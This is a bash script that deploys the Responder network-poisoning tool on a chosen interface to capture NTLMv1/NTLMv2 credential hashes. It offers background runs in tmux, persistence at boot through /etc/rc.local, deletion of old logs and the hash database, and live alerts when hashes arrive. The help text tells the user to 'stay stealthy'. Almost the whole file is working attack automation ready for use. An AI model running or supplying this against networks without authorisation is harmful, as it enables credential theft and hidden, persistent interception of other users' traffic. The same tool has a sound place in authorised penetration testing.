#!/bin/bash

# -------------------- Color Codes --------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# -------------------- Help Menu --------------------
show_help() {
    echo -e "${CYAN}
╔══════════════════════════════════════════════╗
║         DEPLOY-RESPONDER.SH HELP MENU       ║
╚══════════════════════════════════════════════╝${NC}"
    echo -e "${YELLOW}Usage:${NC} sudo ./deploy-responder.sh [options]

${YELLOW}Options:${NC}
  ${GREEN}-h, --help${NC}              Show this help message and exit.

${YELLOW}Features:${NC}
  ${GREEN}• Interface Detection${NC}   Automatically detects the default network interface (can override).
  ${GREEN}• Run Modes${NC}             Choose to run Responder in:
                          - Foreground
                          - Background (via tmux)
                          - Boot-time auto-start (/etc/rc.local)
  ${GREEN}• Auto Clean Logs${NC}       Optional cleanup of old logs and Responder.db (hashes).
  ${GREEN}• Hash Alerting${NC}         Optional live monitoring for NTLMv1/NTLMv2 hash captures.
  ${GREEN}• Safe Exit${NC}             First CTRL+C shows warning, second terminates.
  ${GREEN}• Color Coded UI${NC}        Easy to read output with clear status indicators.

${YELLOW}Logging:${NC}
  All output is saved to: ${CYAN}/var/log/responder/responder_<timestamp>.log${NC}

${YELLOW}Hash Log:${NC}
  Captured hashes stored (by default) in: ${CYAN}/usr/share/responder/Responder.db${NC}

${YELLOW}Examples:${NC}
  ${CYAN}# Run with default options:${NC}
    sudo ./deploy-responder.sh

  ${CYAN}# Show this help menu:${NC}
    ./deploy-responder.sh -h

  ${CYAN}# Re-run in background:${NC}
    sudo ./deploy-responder.sh
    # Choose option 2

${YELLOW}Notes:${NC}
  • Requires root (sudo).
  • Assumes Responder is already installed.
  • Auto-start uses /etc/rc.local (make sure it’s supported by your system).

${GREEN}Happy hunting! Stay stealthy.${NC}
"
    exit 0
}

# -------------------- Help Flag --------------------
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_help
fi

# -------------------- Globals --------------------
exit_confirmed=0
timestamp=$(date +%F_%H-%M-%S)
log_dir="/var/log/responder"
log_file="$log_dir/responder_$timestamp.log"
hash_log="/usr/share/responder/Responder.db"

# -------------------- CTRL+C Trap --------------------
trap ctrl_c INT

ctrl_c() {
    if [[ $exit_confirmed -eq 0 ]]; then
        echo -e "\n${YELLOW}[!] Press CTRL+C again to terminate.${NC}"
        exit_confirmed=1
        sleep 2
    else
        echo -e "\n${RED}[✘] Terminating script and returning to shell.${NC}"
        exit 0
    fi
}

# -------------------- Root Check --------------------
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Please run this script with sudo.${NC}"
    exit 1
fi

# -------------------- Dependency Checks --------------------
if ! command -v responder &>/dev/null; then
    echo -e "${RED}[!] Responder not found. Please install it first.${NC}"
    exit 1
fi

if ! command -v tmux &>/dev/null; then
    echo -e "${YELLOW}[!] tmux not found. Installing...${NC}"
    apt update && apt install -y tmux || { echo -e "${RED}[!] Failed to install tmux.${NC}"; exit 1; }
fi

# -------------------- Interface Selection --------------------
default_iface=$(ip route | grep default | awk '{print $5}' | head -n1)

echo -e "${CYAN}[+] Default interface detected: ${GREEN}$default_iface${NC}"
read -p "$(echo -e "${YELLOW}[?] Use this interface? (Y/n): ${NC}")" use_default

if [[ "$use_default" =~ ^[Nn]$ ]]; then
    read -p "$(echo -e "${YELLOW}Enter interface (e.g., eth0, wlan0): ${NC}")" iface
else
    iface="$default_iface"
fi

if ! ip link show "$iface" &>/dev/null; then
    echo -e "${RED}[!] Interface '${iface}' does not exist.${NC}"
    exit 1
fi

# -------------------- Log Setup --------------------
mkdir -p "$log_dir"

# -------------------- Run Mode Selection --------------------
echo -e "${YELLOW}[?] Run Responder in:${NC}"
echo -e "${CYAN}    1) Foreground"
echo -e "    2) Background (tmux)"
echo -e "    3) Add to boot (startup)${NC}"
read -p "$(echo -e "${YELLOW}Select option [1-3]: ${NC}")" mode

# -------------------- Responder Function --------------------
run_responder() {
    echo -e "${GREEN}[+] Starting Responder on interface: $iface${NC}"
    echo -e "${CYAN}[*] Logging to: $log_file${NC}"
    cd /usr/share/responder || exit 1
    responder -I "$iface" -wdv | tee "$log_file"
}

# -------------------- Add to Startup --------------------
add_to_startup() {
    echo -e "${GREEN}[+] Configuring Responder to run at boot...${NC}"
    cp "$0" /usr/local/bin/deploy-responder.sh
    chmod +x /usr/local/bin/deploy-responder.sh

    # Check if /etc/rc.local exists and is executable
    if [[ ! -f /etc/rc.local ]]; then
        echo -e "${YELLOW}[/etc/rc.local] not found. Creating it...${NC}"
        echo -e "#!/bin/bash\nbash /usr/local/bin/deploy-responder.sh &\nexit 0" > /etc/rc.local
        chmod +x /etc/rc.local
        echo -e "${GREEN}[✓] /etc/rc.local created and startup configured.${NC}"
    else
        if ! grep -q "deploy-responder.sh" /etc/rc.local 2>/dev/null; then
            sed -i -e '$i bash /usr/local/bin/deploy-responder.sh &\n' /etc/rc.local
            echo -e "${GREEN}[✓] Startup command appended to /etc/rc.local.${NC}"
        else
            echo -e "${YELLOW}[!] Responder startup already configured in /etc/rc.local.${NC}"
        fi
    fi
}

# -------------------- Run Selection --------------------
if [[ "$mode" == "2" ]]; then
    session_name="responder_$timestamp"
    echo -e "${CYAN}[*] Launching in background (tmux session: $session_name)${NC}"
    tmux new-session -d -s "$session_name" "cd /usr/share/responder && responder -I $iface -wdv | tee $log_file"
    echo -e "${GREEN}[✓] Running in tmux session: $session_name${NC}"
    echo -e "${CYAN}[*] Use: tmux attach -t $session_name${NC}"
elif [[ "$mode" == "3" ]]; then
    add_to_startup
else
    run_responder
fi

# -------------------- Auto-Clean Feature --------------------
echo -e "${YELLOW}[?] Auto-clean old logs and captured hashes? (y/N): ${NC}"
read clean_choice
if [[ "$clean_choice" =~ ^[Yy]$ ]]; then
    read -p "$(echo -e "${YELLOW}[?] Delete files older than how many days? (e.g., 3): ${NC}")" days_old
    days_old=${days_old:-3}

    echo -e "${CYAN}[*] Cleaning logs older than $days_old days...${NC}"
    find "$log_dir" -type f -name "*.log" -mtime +$days_old -exec rm -f {} \; && \
    echo -e "${GREEN}[✓] Old log files removed.${NC}"

    if [[ -f "$hash_log" ]]; then
        echo -e "${CYAN}[*] Removing captured hashes (Responder.db)...${NC}"
        rm -f "$hash_log" && echo -e "${GREEN}[✓] Hash DB cleared.${NC}"
    else
        echo -e "${YELLOW}[!] No captured hash DB found.${NC}"
    fi
else
    echo -e "${CYAN}[*] Skipping cleanup.${NC}"
fi

# -------------------- Hash Monitoring --------------------
monitor_hashes() {
    echo -e "${CYAN}[*] Monitoring for captured hashes... (Press Ctrl+C to stop)${NC}"
    tail -Fn0 "$hash_log" 2>/dev/null | while read -r line; do
        if [[ "$line" == *"NTLMv"* ]]; then
            echo -e "${GREEN}[+] Hash captured: $line${NC}"
            notify-send "Responder Alert" "Hash captured: $line" 2>/dev/null
        fi
    done
}

read -p "$(echo -e "${YELLOW}[?] Monitor for captured hashes? (Y/n): ${NC}")" monitor
if [[ "$monitor" =~ ^[Nn]$ ]]; then
    echo -e "${CYAN}[*] Skipping hash monitor.${NC}"
else
    monitor_hashes
fi
